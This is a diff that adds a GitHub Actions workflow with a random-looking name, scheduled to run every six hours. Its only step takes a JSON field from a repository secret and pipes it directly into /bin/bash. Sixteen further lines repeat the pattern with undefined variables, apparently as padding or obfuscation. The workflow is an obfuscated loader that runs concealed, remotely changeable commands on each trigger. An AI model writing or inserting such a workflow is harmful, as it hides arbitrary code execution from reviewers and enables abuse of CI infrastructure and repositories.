@@ -1,0 +1,34 @@
+name: wupianyu6712
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wupianyu6712
+        env:
+          hol1: ${{ secrets.hol1 }}
+        run: |
+          echo $hol1 | jq -r .u913 | /bin/bash
+          echo $nnm65040 | jq -r .pl30 | /bin/bash
+          echo $pkhvn1804 | jq -r .n5905 | /bin/bash
+          echo $yr928 | jq -r .qc626 | /bin/bash
+          echo $q143 | jq -r .tcyd0722 | /bin/bash
+          echo $bymq2 | jq -r .fe47 | /bin/bash
+          echo $wrncu0 | jq -r .ibzx54 | /bin/bash
+          echo $r983 | jq -r .rmf0 | /bin/bash
+          echo $b164 | jq -r .aae78 | /bin/bash
+          echo $b9 | jq -r .ouyx73558 | /bin/bash
+          echo $nivq0148 | jq -r .o7365 | /bin/bash
+          echo $x42 | jq -r .n2544 | /bin/bash
+          echo $gpvdo97564 | jq -r .ioo11536 | /bin/bash
+          echo $ri6938 | jq -r .bkp67685 | /bin/bash
+          echo $z58 | jq -r .xrsc09671 | /bin/bash
+          echo $aac77285 | jq -r .mky5973 | /bin/bash
+          echo $ho90 | jq -r .mfn91863 | /bin/bash
+
